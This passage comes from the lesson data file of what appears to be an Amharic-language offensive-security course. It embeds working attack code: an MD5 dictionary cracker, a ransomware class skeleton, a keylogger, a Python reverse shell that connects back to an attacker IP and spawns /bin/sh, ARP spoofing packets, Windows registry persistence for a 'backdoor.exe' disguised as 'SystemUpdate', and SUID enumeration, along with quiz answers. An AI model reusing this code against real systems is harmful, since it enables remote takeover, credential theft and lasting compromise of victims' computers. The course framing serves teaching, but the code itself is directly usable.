Hash ወደ ኋላ አይመለስም (One-way)። ከ \`e10a...\` ተነስተን \`123456\`ን ማግኘት አንችልም (በሂሳብ)።

### How do we crack it? (Dictionary Attack)
ሃከሮች የሚጠቀሙት ዘዴ፡ "መገመት"።
1.  አንድ የቃላት ዝርዝር (Dictionary) ይወስዳሉ።
2.  እያንዳንዱን ቃል Hash ያደርጋሉ።
3.  ከፈለጉት Hash ጋር እኩል ከሆነ፣ ፓስዎርዱን አገኙ ማለት ነው።

\`\`\`python
import hashlib

target_hash = "5f4dcc3b5aa765d61d8327deb882cf99" # 'password'
wordlist = ["admin", "123456", "password", "qwerty"]

print("Starting Crack...")
for word in wordlist:
    # Hash the guess
    hashed = hashlib.md5(word.encode()).hexdigest()
    
    if hashed == target_hash:
        print(f"[+] Cracked! Password is: {word}")
        break
else:
    print("[-] Password not found in wordlist.")
\`\`\`
`,
    `import hashlib\nh = hashlib.md5(b"hello").hexdigest()\nprint(h)`,
    [{id:"q1", question:"Hashን ወደ ኋላ መመለስ (Decrypt) ይቻላል?", options:[{id:"a",text:"አዎ"},{id:"b",text:"አይ፣ One-way ነው"},{id:"c",text:"Admin ብቻ ይችላል"}], correctOptionId:"b", explanation:"Hash ተፈጥሮው መረጃን ማጥፋት ነው፣ መመለስ አይቻልም (ከመገመት ውጪ)።"}]
  ),
];

// =====================================================================
// 2. ADVANCED TRACK (RED TEAM OPS)
// =====================================================================

const PYTHON_ADVANCED_LESSONS: Lesson[] = [
  // --- MODULE 6: ADVANCED PYTHON CONCEPTS ---
  createLesson(
    "a-01", "06. Advanced Python", "6.1 OOP for Malware", "Advanced", "Using Classes for scalable tools.",
    `# Object Oriented Programming (OOP) for Hackers

የተራቀቁ ማልዌሮች (Malware) እና Tools ሲሰሩ፣ ኮዱን በ Function ብቻ ማስተዳደር ይከብዳል። **Classes** እና **Objects** መጠቀም አለብን። ይህ ኮዳችንን "Structured" እና በቀላሉ የሚሰፋ ያደርገዋል።

### The Concept
*   **Class:** የቫይረሱ ዲዛይን (Blueprint)።
*   **Object:** ዲዛይኑን ተጠቅመን የሰራነው እውነተኛው ቫይረስ።

ለምሳሌ \`Ransomware\` የሚባል Class ሰርተን፣ \`encrypt()\` እና \`decrypt()\` የሚባሉ methods (functions) ልንሰጠው እንችላለን።

\`\`\`python
class Ransomware:
    def __init__(self, target_ext):
        self.extension = target_ext
        self.key = "SecretKey123" # In real life, generate random key

    def encrypt_file(self, filename):
        print(f"[*] Encrypting {filename} with key {self.key}...")
        # እዚህ ጋር Encryption logic ይገባል
        
    def demand_ransom(self):
        print("YOUR FILES ARE ENCRYPTED! PAY 1 BTC.")

# Using the class
virus = Ransomware(".txt")
virus.encrypt_file("salary.txt")
virus.demand_ransom()
\`\`\`
`,
    `class Exploit:\n    def run(self):\n        print("Exploit Running...")\n\ne = Exploit()\ne.run()`,
    [{id:"q1", question:"__init__ function ምንድነው?", options:[{id:"a",text:"ቫይረሱን የሚያጠፋ"},{id:"b",text:"Class ሲፈጠር የሚጠራ (Constructor)"},{id:"c",text:"Loop ነው"}], correctOptionId:"b", explanation:"__init__ ኦብጀክቱ ሲፈጠር መረጃዎችን ለማዘጋጀት ይጠቅማል።"}]
  ),

  createLesson(
    "a-02", "06. Advanced Python", "6.2 Multithreading", "Advanced", "Speeding up scans with concurrency.",
    `# Multithreading: Need for Speed

እስካሁን የሰራነው Port Scanner አንድ ፖርት ፈትሾ እስኪጨርስ ይጠብቃል። 1000 ፖርት ለመፈተሽ ደቂቃዎች ይፈጃል።
**Threading** ማለት በአንድ ጊዜ ብዙ ሰራተኞችን (Threads) እንደማሰማራት ነው።

### Implementation
\`threading\` ሞጁልን በመጠቀም ስካነራችንን እናፈጥናለን።

\`\`\`python
import threading
import time

def scan_port(port):
    # Simulation of scanning logic
    time.sleep(1) # ይሄ አንድ ሰከንድ ይፈጃል እንበል
    print(f"Scanned Port {port}")

# Without Threads: 5 seconds for 5 ports
# With Threads: ~1 second for 5 ports (ሁሉም በአንድ ጊዜ ይጀምራሉ)

threads = []
for p in range(5):
    t = threading.Thread(target=scan_port, args=(p,))
    threads.append(t)
    t.start()
    
# Wait for all threads to finish
for t in threads:
    t.join()
\`\`\`
`,
    `import threading\ndef worker(n):\n    print(f"Thread {n} working...")\n\nt = threading.Thread(target=worker, args=(1,))\nt.start()`,
    [{id:"q1", question:"Threading ዋና ጥቅሙ ምንድነው?", options:[{id:"a",text:"ኮዱን ለማሳመር"},{id:"b",text:"በርካታ ስራዎችን በአንድ ጊዜ ለመስራት (Concurrency)"},{id:"c",text:"Memory ለመቆጠብ"}], correctOptionId:"b", explanation:"Threading I/O bound ስራዎችን (እንደ Network scanning) በጣም ያፈጥናል።"}]
  ),

  // --- MODULE 7: ADVANCED EXPLOITATION ---
  createLesson(
    "a-03", "07. Exploitation", "7.1 Writing a Keylogger", "Advanced", "Spyware concepts using Pynput.",
    `# Writing a Keylogger

**ማስጠንቀቂያ:** ይህ ለትምህርት ብቻ ነው። በራስህ ማሽን ላይ ብቻ ሞክረው።

Keylogger ማለት ተጠቃሚው ኪቦርድ ላይ የሚነካውን ሁሉ የሚመዘግብ ማልዌር ነው። ለዚህ \`pynput\` የተባለ Library እንጠቀማለን።

### The Logic
1.  **Listener:** ኪቦርዱን የሚያዳምጥ ኮድ።
2.  **Callback Function:** ቁልፍ ሲነካ ምን ይደረግ? (ወደ ፋይል ጻፍ ወይም ወደ ሃከሩ ላክ)።

\`\`\`python
# Concept Code (Requires local setup)
# from pynput.keyboard import Listener

def on_press(key):
    # ቁልፉን ወደ Log file መጻፍ
    # In real attack, this logs to a hidden file
    with open("log.txt", "a") as f:
        f.write(str(key))

# with Listener(on_press=on_press) as listener:
#    listener.join()
\`\`\`
`,
    `# Simulated Keylog\nkeys = ['u', 's', 'e', 'r']\nlog = "".join(keys)\nprint(f"Logged: {log}")`,
    [{id:"q1", question:"Keylogger ዋና አላማው ምንድነው?", options:[{id:"a",text:"ፋይል ማጥፋት"},{id:"b",text:"የሚጻፈውን መረጃ መስረቅ (Password, Chat)"},{id:"c",text:"Screen መቅዳት"}], correctOptionId:"b", explanation:"Keylogger የቁልፍ ሰሌዳ ምቶች (Keystrokes) ይመዘግባል።"}]
  ),

  createLesson(
    "a-04", "07. Exploitation", "7.2 Reverse Shells", "Advanced", "Remote Control concepts.",
    `# Reverse Shells

ሃከሮች ሲስተሙን ከሰበሩ በኋላ (Exploit ካደረጉ በኋላ)፣ የኮምፒውተሩን Terminal/CMD ማግኘት ይፈልጋሉ።
ሁለት አይነት ግንኙነት አለ፡
1.  **Bind Shell:** ሃከሩ ወደ ተጠቂው ይደውላል። (Firewall ብዙ ጊዜ ስለሚዘጋው አይመከርም)።
2.  **Reverse Shell:** ተጠቂው ወደ ሃከሩ ይደውላል። (Firewall ብዙ ጊዜ የወጪ ጥሪን ስለሚፈቅድ ይህ ይመረጣል)።

### Python Reverse Shell (Client Side)
ይህ ኮድ በተጠቂው ኮምፒውተር ላይ ቢሮጥ፣ CMD/Bashን ለሃከሩ ይሰጣል።

\`\`\`python
import socket
import subprocess
import os

hacker_ip = "10.0.0.1"
port = 4444

s = socket.socket()
s.connect((hacker_ip, port))

# Redirect streams to socket (Stdin, Stdout, Stderr)
# ይህ ማለት ሃከሩ የሚጽፈው እንደ Input፣ ኮምፒውተሩ የሚመልሰው እንደ Output ይሄዳል
os.dup2(s.fileno(), 0) 
os.dup2(s.fileno(), 1) 
os.dup2(s.fileno(), 2) 

p = subprocess.call(["/bin/sh", "-i"])
\`\`\`
`,
    `print("[*] Connecting back to C2...")\nprint("[+] Shell Spawned!")`,
    [{id:"q1", question:"Reverse Shell ከ Bind Shell በምን ይሻላል?", options:[{id:"a",text:"ይፈጥናል"},{id:"b",text:"Firewallን ለማለፍ ይመረጣል"},{id:"c",text:"Code ለመጻፍ ይቀላል"}], correctOptionId:"b", explanation:"አብዛኛው Firewall ወደ ውስጥ የሚገባን ይዘጋል እንጂ የሚወጣን አይዘጋም።"}]
  ),
  
  createLesson(
    "a-05", "07. Exploitation", "7.3 ARP Spoofing", "Advanced", "Man in the Middle Attacks with Scapy.",
    `# ARP Spoofing (Man in the Middle)

በ Local Network (WiFi) ውስጥ፣ ኮምፒውተሮች እርስ በርስ የሚተዋወቁት በ **MAC Address** ነው። IP Addressን ወደ MAC Address የሚቀይረው ፕሮቶኮል **ARP (Address Resolution Protocol)** ይባላል።

ARP Spoofing ማለት፡
1.  ለ Routeru: "እኔ እኮ Victim ነኝ" ብሎ መዋሸት።
2.  ለ Victim-u: "እኔ እኮ Router ነኝ" ብሎ መዋሸት።

ይህ ሲሳካ፣ የ Victim-u ሙሉ የኢንተርኔት ትራፊክ (Passowrds, Images) በእኛ ኮምፒውተር በኩል ያልፋል።

### Scapy Library
Python ላይ \`Scapy\` የተባለ Library በመጠቀም የውሸት ARP Packet መላክ ይቻላል።

\`\`\`python
# Scapy Logic
# op=2 tells Scapy this is a 'Response' (reply), not a 'Request'
# We tell the victim that Router IP is at Hacker MAC

# packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=router_ip)
# send(packet)
\`\`\`
`,
    `print("Spoofing 192.168.1.5...")\nprint("Redirecting traffic...")`,
    [{id:"q1", question:"ARP Spoofing ምን አይነት ጥቃት ነው?", options:[{id:"a",text:"DoS"},{id:"b",text:"Man in the Middle (MitM)"},{id:"c",text:"Phishing"}], correctOptionId:"b", explanation:"ሃከሩ በመሃል ገብቶ መረጃ ይሰርቃል።"}]
  ),

  // --- MODULE 8: WIRELESS HACKING (NEW) ---
  createLesson(
    "a-06", "08. WiFi Hacking", "8.1 Monitor Mode & Packets", "Advanced", "Understanding Wireless frames.",
    `# Wireless Hacking Theory

WiFi የሚሰራው በሬዲዮ ሞገድ ነው። ማንኛውም ሰው በአየር ላይ የሚሄደውን መረጃ "መጥለፍ" (Sniff) ይችላል። ነገር ግን Network Card በተፈጥሮ የሚመለከተው ለእሱ የተላከውን ብቻ ነው።

### Monitor Mode
የሌሎችን ሰው ትራፊክ ለማዳመጥ፣ የ Network Card-አችንን ወደ **Monitor Mode** መቀየር አለብን።

\`\`\`python
import subprocess

def enable_monitor_mode(interface):
    print(f"Switching {interface} to Monitor Mode...")
    subprocess.run(["ifconfig", interface, "down"])
    subprocess.run(["iwconfig", interface, "mode", "monitor"])
    subprocess.run(["ifconfig", interface, "up"])
\`\`\`

### Deauthentication Attack (WiFi Jamming)
አንድን ሰው ከ WiFi ላይ ለማስወጣት "Deauth Packet" እንልካለን። ይህ ለሁለት ነገር ይጠቅማል፡
1.  ሰውን ለማጥቃት (DoS).
2.  ሰውየው ሲመለስ "Handshake" ለመጥለፍ (Password ለመስበር)።
`,
    `print("Interface wlan0mon enabled.")\nprint("Sniffing beacons...")`,
    [{id:"q1", question:"Monitor Mode ጥቅሙ ምንድነው?", options:[{id:"a",text:"Network ለማፍጠን"},{id:"b",text:"ያለ እኛ ፍቃድ የሚሄዱ ሁሉንም ፓኬቶች ለማየት"},{id:"c",text:"IP ለመደበቅ"}], correctOptionId:"b", explanation:"Promiscuous mode አይነት ነው፣ ግን ለ Wireless።"}]
  ),

  // --- MODULE 9: POST EXPLOITATION (NEW) ---
  createLesson(
    "a-07", "09. Post Exploitation", "9.1 Persistence", "Advanced", "Staying inside the system.",
    `# Persistence: Never Let Go

አንዴ ኮምፒውተሩን ከሰበርን በኋላ፣ ተጠቃሚው ኮምፒውተሩን ቢያጠፋው (Restart)፣ የኛ Connection ይቋረጣል። **Persistence** ማለት ኮምፒውተሩ በበራ ቁጥር የእኛ ቫይረስ አብሮ እንዲነሳ ማድረግ ነው።

### Windows Registry Persistence
Windows ሲነሳ የሚሮጡ ፕሮግራሞች ዝርዝር **Registry** ውስጥ አለ።
\`HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\`

Pythonን ተጠቅመን ቫይረሳችንን እዚህ ውስጥ እንጨምራለን።

\`\`\`python
import winreg as reg
import os

def add_to_startup():
    path = os.getcwd() + "\\\\backdoor.exe"
    key = reg.HKEY_CURRENT_USER
    key_path = "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
    
    open = reg.OpenKey(key, key_path, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open, "SystemUpdate", 0, reg.REG_SZ, path)
    reg.CloseKey(open)
    print("[+] Persistence established!")
\`\`\`
`,
    `print("Adding registry key...")\nprint("Backdoor will run on reboot.")`,
    [{id:"q1", question:"Persistence ለምን ይጠቅማል?", options:[{id:"a",text:"Admin ለመሆን"},{id:"b",text:"Restart ከተደረገ በኋላ ተመልሶ ለመግባት"},{id:"c",text:"Firewall ለማጥፋት"}], correctOptionId:"b", explanation:"Accessን ጠብቆ ማቆየት (Maintain Access)።"}]
  ),

  createLesson(
    "a-08", "09. Post Exploitation", "9.2 Privilege Escalation", "Advanced", "Going from User to Admin.",
    `# Privilege Escalation

ወደ ሲስተም ስንገባ ብዙ ጊዜ ተራ ተጠቃሚ (Standard User) ሆነን ነው። አላማችን **Root** (Linux) ወይም **Administrator** (Windows) መሆን ነው።

### Enumeration Scripts
PrivEsc ከማድረጋችን በፊት መረጃ መሰብሰብ አለብን።
*   OS Version ስንት ነው? (Kernel Exploit አለ?)
*   Saved Passwords አሉ?
*   Misconfigured Services አሉ?

\`\`\`python
import os

def enum_system():
    print("[*] Gathering System Info...")
    os.system("uname -a") # Kernel info
    os.system("id") # Current user
    
    # Check for SUID binaries (Linux specific)
    # እነዚህ ፋይሎች በ Root privilege ነው የሚሮጡት
    print("[*] Searching for SUID files...")
    os.system("find / -perm -u=s -type f 2>/dev/null")
\`\`\`
`,
    `import os\nprint("User: www-data (Low Privilege)")\nprint("Goal: root")`,
    [{id:"q1", question:"SUID bit ያላቸው ፋይሎች ለምን አደገኛ ናቸው?", options:[{id:"a",text:"ቫይረስ ስለሆኑ"},{id:"b",text:"ባለቤቱ (Root) ባለው ስልጣን ስለሚሮጡ"},{id:"c",text:"ለመደለዝ ስለማይችሉ"}], correctOptionId:"b", explanation:"ተራ user ይህን ፋይል ሲሮጥ እንደ Root ሆኖ ይሮጣል፣ ይህ ከተበላሸ ወደ Root መቀየር ይቻላል።"}]
  ),
];

const CPP_LESSONS: Lesson[] = [
    { id: "cpp-1", category: "Memory", title: "1.1 Pointers", description: "Direct memory access", level: "Advanced", content: "# Pointers\nDirect memory manipulation.", starterCode: "int* p;", quiz: [] }
];

export const getCourseData = (language: Language, isBeginner: boolean = true): SyllabusItem[] => {
  const lessons = language === 'python' 
    ? (isBeginner ? PYTHON_BEGINNER_LESSONS : PYTHON_ADVANCED_LESSONS)
    : CPP_LESSONS;

  return lessons.map(l => ({
    id: l.id,
    title: l.title,
    description: l.description,
    category: l.category,
    level: l.level
  }));
};

export const getLessonById = (id: string): { title: string, content: string, starterCode: string, quiz?: QuizQuestion[], isProject?: boolean } => {
  const allLessons = [...PYTHON_BEGINNER_LESSONS, ...PYTHON_ADVANCED_LESSONS, ...CPP_LESSONS];
  const lesson = allLessons.find(l => l.id === id);

  if (lesson) {
    return {
      title: lesson.title,
      content: lesson.content,
      starterCode: lesson.starterCode,
      quiz: lesson.quiz,
      isProject: lesson.isProject
    };
  }

  return {
    title: "Module Loading Error",
    content: "# 404 Not Found\nThe requested module could not be loaded.",
    starterCode: "# Error"
  };
};
